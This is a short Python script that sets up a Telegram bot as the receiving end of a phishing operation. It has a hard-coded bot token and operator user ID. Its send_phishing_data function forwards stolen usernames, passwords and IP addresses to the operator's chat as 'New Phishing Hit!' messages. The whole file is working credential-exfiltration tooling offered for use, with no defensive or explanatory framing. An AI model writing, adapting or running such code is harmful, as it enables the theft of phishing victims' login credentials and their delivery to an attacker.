from telebot import TeleBot

# Your receiver bot token
TOKEN = "8050097261:AAGh6k3pUOBcpUuBBHozE7BAvh64MKqmrhM"
bot = TeleBot(TOKEN)

# Your Telegram user ID where the data will be sent
ADMIN_ID = 7407431042  # Replace with your actual Telegram ID

@bot.message_handler(commands=['start'])
def welcome(msg):
    bot.send_message(msg.chat.id, "✅ Bot is active.\nWait for phishing data to appear here.")

def send_phishing_data(username, password, ip=None):
    text = f"🕵️ *New Phishing Hit!*\n\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`"
    if ip:
        text += f"\n🌐 *IP:* `{ip}`"
    bot.send_message(ADMIN_ID, text, parse_mode="Markdown")

# To keep it running
print("🔐 Receiver Bot is Running...")
bot.polling()
